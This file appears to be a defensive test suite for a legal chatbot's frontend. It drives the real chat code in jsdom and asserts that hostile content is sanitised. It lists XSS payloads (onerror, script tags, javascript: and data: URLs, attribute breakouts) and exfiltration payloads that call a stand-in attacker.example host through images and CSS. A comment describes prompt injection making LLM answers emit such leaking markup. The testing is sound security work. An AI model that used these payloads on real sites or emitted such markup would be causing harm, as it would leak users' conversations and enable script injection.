/**
 * XSS surface of the chat frontend (audit P3.6).
 *
 * chat.js is loaded UNMODIFIED into jsdom together with the vendored marked + DOMPurify, and the
 * real entry point (window.jurixChat.loadSession) is driven with a fake server that returns
 * hostile content. jsdom does not fire inline handlers or load images here, so the assertions
 * are structural: the resulting DOM must contain no executable node, no on* attribute and no
 * javascript: URL. A control test proves the detector is not vacuous.
 */
import { test, afterEach } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import path from 'node:path';
import { JSDOM } from 'jsdom';

const JS_DIR = path.resolve(import.meta.dirname, '../../src/apps/core/static/js');
const read = (f) => fs.readFileSync(path.join(JS_DIR, f), 'utf8');

const SKELETON = `<!doctype html><html><body data-authenticated="true">
<aside id="sidebar"><div id="chat-sessions-list"></div></aside>
<button id="toggle-sidebar"></button><button id="new-chat-button"></button>
<div id="messages-container"><div id="messages-wrapper">
  <div id="welcome-state"><span class="greeting-text"></span><span class="greeting-name"></span>
  <div id="suggestion-chips"></div></div></div></div>
<form id="chat-form"><textarea id="question-textarea"></textarea><button id="send-button"></button></form>
<div id="chat-toast-notification"></div>
<div id="delete-session-modal"><button id="delete-modal-cancel"></button><button id="delete-modal-confirm"></button></div>
</body></html>`;

const HOSTILE = [
  '<img src=x onerror="window.__xss=1">',
  '<script>window.__xss=1</script>',
  '<svg onload="window.__xss=1"></svg>',
  '<iframe src="javascript:window.__xss=1"></iframe>',
  '<a href="javascript:window.__xss=1">clique</a>',
  '[md-link](javascript:window.__xss=1)',
  '<details open ontoggle="window.__xss=1">x</details>',
  '"><img src=x onerror=window.__xss=1>',
].join('\n\n');

/** Inline handlers that carry no attacker-controlled data (see the audit notes for P3.6). */
function isKnownStaticHandler(el, attr) {
  if (attr.name !== 'onclick') return false;
  const v = attr.value;
  const deleteSession = /^event\.stopPropagation\(\); window\.jurixChat\.deleteSession\((\d+|'temp-[\w-]+')(, event)?\)$/;
  return deleteSession.test(v) || (el.classList.contains('chip') && v.startsWith('window.jurixChat.askQuestion('));
}

/** Every reason the DOM under `root` could execute attacker-controlled code. */
function findDangerous(root) {
  const found = [];
  for (const el of root.querySelectorAll('*')) {
    const tag = el.tagName.toLowerCase();
    if (['script', 'iframe', 'object', 'embed', 'frame', 'meta', 'base', 'form'].includes(tag) && !el.closest('#chat-form')) {
      found.push(`<${tag}>`);
    }
    for (const attr of el.attributes) {
      if (/^on/i.test(attr.name) && !isKnownStaticHandler(el, attr)) found.push(`${tag}[${attr.name}=${attr.value.slice(0, 50)}]`);
      if (['href', 'src', 'xlink:href', 'action', 'formaction', 'srcdoc'].includes(attr.name.toLowerCase())
          && /^\s*(javascript|data\s*:\s*text\/html|vbscript):/i.test(attr.value)) {
        found.push(`${tag}[${attr.name}=${attr.value.slice(0, 30)}]`);
      }
    }
  }
  return found;
}

const tick = () => new Promise((r) => setTimeout(r, 30));
const activeWindows = new Set();

afterEach(() => {
  for (const window of activeWindows) window.close();
  activeWindows.clear();
});

async function boot(routes) {
  const dom = new JSDOM(SKELETON, { url: 'http://localhost/normas/chatbot/', runScripts: 'dangerously', pretendToBeVisual: true });
  const { window } = dom;
  window.JURIX_CONFIG = { chatbotUrl: '/normas/chatbot/', logoIconUrl: '/static/x.svg', userName: 'Ana' };
  window.fetch = async (url) => {
    const handler = routes[String(url).split('?')[0]];
    const body = handler ? handler() : { success: false };
    return { ok: !!handler, status: handler ? 200 : 404, json: async () => body, text: async () => JSON.stringify(body) };
  };
  window.eval(read('vendor/marked.min.js'));
  window.eval(read('vendor/purify.min.js'));
  // Mirror the production dependency order. chat.js is intentionally a UI
  // consumer and should not be tested with its transport/state modules absent.
  for (const file of [
    'jurix-markdown.js',
    'jurix-rag.js',
    'jurix-anonymous-history.js',
    'jurix-chat-api.js',
    'jurix-api-reliability-overlay.js',
    'jurix-chat-sessions.js',
    'jurix-chat-state.js',
    'jurix-chat-renderer.js',
  ]) window.eval(read(file));
  window.eval(read('chat.js'));
  await tick();
  activeWindows.add(window);
  return window;
}

const session = (over = {}) => ({ id: 1, title: 'Conversa', slug: 'abc123abc123', is_active: true, created_at: null, updated_at: null, ...over });

test('control: the detector flags an unsanitised payload (so the other tests are not vacuous)', () => {
  const { window } = new JSDOM('<div id="r"></div>');
  window.document.getElementById('r').innerHTML = HOSTILE;
  const hits = findDangerous(window.document);
  assert.ok(hits.some((h) => h.includes('onerror')), hits.join());
  assert.ok(hits.some((h) => h.includes('<script>')), hits.join());
  assert.ok(hits.some((h) => h.includes('javascript:')), hits.join());
});

test('assistant answers are sanitised, while ordinary markdown still renders', async () => {
  const window = await boot({
    '/api/v1/chat/sessions/': () => ({ success: true, sessions: [], count: 0 }),
    '/api/v1/chat/sessions/1/': () => ({
      success: true, session: session(),
      messages: [
        { id: 1, role: 'user', content: 'pergunta', sources: [], metadata: {}, created_at: null },
        { id: 2, role: 'assistant', content: `**Art. 5º** vale.\n\n${HOSTILE}`, sources: [], metadata: {}, created_at: null },
      ],
      count: 2, total_count: 2, has_more: false,
    }),
  });
  await window.jurixChat.loadSession(1);
  await tick();

  const wrapper = window.document.getElementById('messages-wrapper');
  assert.deepEqual(findDangerous(wrapper), []);
  assert.ok(wrapper.querySelector('strong'), 'benign markdown must survive sanitisation');
  assert.match(wrapper.textContent, /Art\. 5º/);
  assert.equal(window.__xss, undefined);
});

test('user messages never become executable HTML (the safe text stays visible)', async () => {
  const window = await boot({
    '/api/v1/chat/sessions/': () => ({ success: true, sessions: [], count: 0 }),
    '/api/v1/chat/sessions/1/': () => ({
      success: true, session: session(),
      messages: [{ id: 1, role: 'user', content: 'olá mundo <img src=x onerror="window.__xss=1"><script>window.__xss=1</script>', sources: [], metadata: {}, created_at: null }],
      count: 1, total_count: 1, has_more: false,
    }),
  });
  await window.jurixChat.loadSession(1);
  await tick();

  const wrapper = window.document.getElementById('messages-wrapper');
  assert.deepEqual(findDangerous(wrapper), []);
  assert.match(wrapper.textContent, /olá mundo/, 'the legitimate text must survive');
  // DOMPurify keeps a plain <img src>; what matters is that it carries no handler (checked above).
  for (const img of wrapper.querySelectorAll('img')) assert.equal([...img.attributes].some((a) => /^on/i.test(a.name)), false);
});

test('hostile session title and preview in the sidebar are escaped', async () => {
  const evil = 'texto<img src=x onerror="window.__xss=1"><script>window.__xss=1</script>';
  const window = await boot({
    '/api/v1/chat/sessions/': () => ({
      success: true, count: 1,
      sessions: [{ ...session({ title: evil }), message_count: 1, latest_message_preview: evil }],
    }),
  });
  const list = window.document.getElementById('chat-sessions-list');
  assert.ok(list.children.length > 0, 'the session list should have rendered');
  assert.deepEqual(findDangerous(list), []);
  // escaped, therefore visible as literal text rather than interpreted
  assert.match(list.textContent, /<img src=x onerror=/);
  assert.equal(list.querySelector('img'), null);
  assert.equal(list.querySelector('script'), null);
});

test('hostile source fields (title, refs, urls) cannot inject markup', async () => {
  const evil = '"><img src=x onerror="window.__xss=1"><a href="javascript:window.__xss=1">x</a>';
  const window = await boot({
    '/api/v1/chat/sessions/': () => ({ success: true, sessions: [], count: 0 }),
    '/api/v1/chat/sessions/1/': () => ({
      success: true, session: session(),
      messages: [{
        id: 2, role: 'assistant', content: 'resposta', metadata: {}, created_at: null,
        sources: [{
          id: 9, text: evil, full_text: evil, similarity_score: 0.9, distance: 0.1, norma_ref: evil,
          norma_id: 3, dispositivo_ref: evil, hierarchy: evil, pdf_url: 'javascript:window.__xss=1',
          sapl_url: 'javascript:window.__xss=1', dispositivo_id: 9,
        }],
      }],
      count: 1, total_count: 1, has_more: false,
    }),
  });
  await window.jurixChat.loadSession(1);
  await tick();

  assert.deepEqual(findDangerous(window.document.getElementById('messages-wrapper')), []);
});


// --------------------------------------------------------------------------------------------
// Source cards (audit P3.6): pdf_url / sapl_url come from ingested SAPL data. They used to be
// interpolated into  onclick="window.open('${escapeHtml(url)}')"  -- escapeHtml() does not escape
// quotes, and the card HTML is not passed through DOMPurify.
// --------------------------------------------------------------------------------------------
const source = (over) => ({ id: 9, text: 'texto', full_text: 'texto', similarity_score: 0.9, norma_ref: 'Lei 1/2020',
  dispositivo_ref: 'Art. 1º', norma_id: 3, dispositivo_id: 9, pdf_url: null, sapl_url: null, ...over });

async function renderWithSource(src) {
  const window = await boot({
    '/api/v1/chat/sessions/': () => ({ success: true, sessions: [], count: 0 }),
    '/api/v1/chat/sessions/1/': () => ({
      success: true, session: session(),
      messages: [{ id: 2, role: 'assistant', content: 'resposta', metadata: {}, created_at: null, sources: [src] }],
      count: 1, total_count: 1, has_more: false,
    }),
  });
  const opened = [];
  window.open = (...args) => { opened.push(args); return null; };
  await window.jurixChat.loadSession(1);
  await tick(); await tick();
  return { window, opened, card: window.document.querySelector('.source-card') };
}

const EXPLOITS = {
  'breaks out of the JS string in onclick': "x'); window.__xss=1; ('",
  'breaks out of the HTML attribute': 'x" onmouseover="window.__xss=1" data-x="',
  'javascript: URL': 'javascript:window.__xss=1',
  'data: URL': 'data:text/html,<script>window.__xss=1</script>',
};

for (const [name, payload] of Object.entries(EXPLOITS)) {
  for (const field of ['pdf_url', 'sapl_url']) {
    test(`source card ${field} that ${name} cannot execute code`, async () => {
      const { window, opened, card } = await renderWithSource(source({ [field]: payload }));
      assert.ok(card, 'the source card should have rendered');

      assert.deepEqual(findDangerous(window.document.getElementById('messages-wrapper')), []);
      card.click();
      card.dispatchEvent(new window.MouseEvent('mouseover', { bubbles: true }));
      assert.equal(window.__xss, undefined, 'attacker code ran');
      for (const [url] of opened) assert.match(String(url), /^https?:/, 'only http(s) may be opened');
    });
  }
}

test('source card: a legitimate https URL (with & and query) still opens in a new tab', async () => {
  const url = 'https://sapl.natal.rn.leg.br/media/x.pdf?a=1&b=2';
  const { opened, card } = await renderWithSource(source({ pdf_url: url }));
  card.click();
  assert.equal(opened.length, 1);
  assert.equal(opened[0][0], url);
  assert.equal(opened[0][1], '_blank');
  assert.match(String(opened[0][2] || ''), /noopener/, 'the new tab must not get window.opener');
});

test('source card: a hostile pdf_url falls back to a valid sapl_url', async () => {
  const { opened, card } = await renderWithSource(source({ pdf_url: 'javascript:1', sapl_url: 'https://sapl.natal.rn.leg.br/n/1' }));
  card.click();
  assert.equal(opened[0][0], 'https://sapl.natal.rn.leg.br/n/1');
});

test('source card: without any safe URL the card is not clickable', async () => {
  const { opened, card } = await renderWithSource(source({ pdf_url: 'javascript:1' }));
  assert.ok(!card.classList.contains('source-card-clickable'));
  card.click();
  assert.equal(opened.length, 0);
});

// --------------------------------------------------------------------------------------------
// Exfiltration through rendered answers (audit P3.6). The answer is LLM output built from
// ingested text, so an injected instruction can make it emit markup whose only effect is that the
// BROWSER requests an attacker URL with the conversation in the query string. No script needed,
// so the XSS checks above cannot see it.
// --------------------------------------------------------------------------------------------

/** Elements that make the browser fetch a remote resource by themselves (everything but <a>). */
function findAutoLoaders(root) {
  const found = [];
  const remote = /(https?:)?\/\/|url\(/i;
  for (const el of root.querySelectorAll('*')) {
    const tag = el.tagName.toLowerCase();
    if (tag === 'a') continue;
    if (['img', 'picture', 'source', 'video', 'audio', 'track', 'link', 'style', 'image', 'use', 'svg', 'math'].includes(tag)) {
      found.push(`<${tag}>`);
      continue;
    }
    for (const attr of el.attributes) {
      if (['src', 'srcset', 'poster', 'background', 'style', 'href', 'xlink:href', 'data'].includes(attr.name) && remote.test(attr.value)) {
        found.push(`${tag}[${attr.name}]`);
      }
    }
  }
  return found;
}

const EXFIL = {
  'markdown image': '![](https://attacker.example/leak?q=SEGREDO)',
  'html img': '<img src="https://attacker.example/leak?q=SEGREDO">',
  'html img with srcset': '<img srcset="https://attacker.example/a 1x">',
  'svg image': '<svg><image href="https://attacker.example/leak?q=SEGREDO"/></svg>',
  'css background': '<div style="background:url(https://attacker.example/leak?q=SEGREDO)">x</div>',
  'video poster': '<video poster="https://attacker.example/leak"></video>',
  'stylesheet link': '<link rel="stylesheet" href="https://attacker.example/x.css">',
  'style @import': '<style>@import url(https://attacker.example/x.css);</style>',
};

async function renderAnswer(content) {
  const window = await boot({
    '/api/v1/chat/sessions/': () => ({ success: true, sessions: [], count: 0 }),
    '/api/v1/chat/sessions/1/': () => ({
      success: true, session: session(),
      messages: [{ id: 2, role: 'assistant', content, sources: [], metadata: {}, created_at: null }],
      count: 1, total_count: 1, has_more: false,
    }),
  });
  await window.jurixChat.loadSession(1);
  await tick();
  // Only the rendered ANSWER: the surrounding chrome (avatar, icon buttons) legitimately has img/svg.
  const body = window.document.querySelector('#messages-wrapper .message-assistant .message-body');
  assert.ok(body, 'the assistant answer body should have rendered');
  return body;
}

for (const [name, payload] of Object.entries(EXFIL)) {
  test(`answer cannot make the browser request a remote resource: ${name}`, async () => {
    const wrapper = await renderAnswer(`Texto seguro.\n\n${payload}\n\nFim.`);
    assert.deepEqual(findAutoLoaders(wrapper), []);
    assert.match(wrapper.textContent, /Texto seguro\./, 'the rest of the answer must survive');
  });
}

test('control: findAutoLoaders flags an unsanitised image (detector is not vacuous)', () => {
  const { window } = new JSDOM('<div id="r"></div>');
  window.document.getElementById('r').innerHTML = EXFIL['html img'] + EXFIL['css background'];
  assert.ok(findAutoLoaders(window.document).length >= 2);
});

test('legitimate legal markdown still renders: bold, lists, tables, code, links, headings', async () => {
  const md = [
    '### Art. 5º', '', '**Prazo:** 30 dias.', '', '- inciso um', '- inciso dois', '',
    '| Tipo | Prazo |', '|---|---|', '| A | 10 |', '',
    '`código`', '', '[Lei 123](https://sapl.natal.rn.leg.br/norma/123)',
  ].join('\n');
  const wrapper = await renderAnswer(md);
  for (const sel of ['h3', 'strong', 'ul li', 'table td', 'code']) assert.ok(wrapper.querySelector(sel), `missing ${sel}`);
  const a = wrapper.querySelector('a[href^="https://sapl.natal.rn.leg.br"]');
  assert.ok(a, 'a normal https link must survive');
  assert.deepEqual(findDangerous(wrapper), []);
});

test('table column alignment survives (marked emits the align attribute, not style)', async () => {
  const body = await renderAnswer('| A | B | C |\n|:--|:-:|--:|\n| 1 | 2 | 3 |');
  const aligns = [...body.querySelectorAll('th')].map((th) => th.getAttribute('align'));
  assert.deepEqual(aligns, ['left', 'center', 'right']);
});
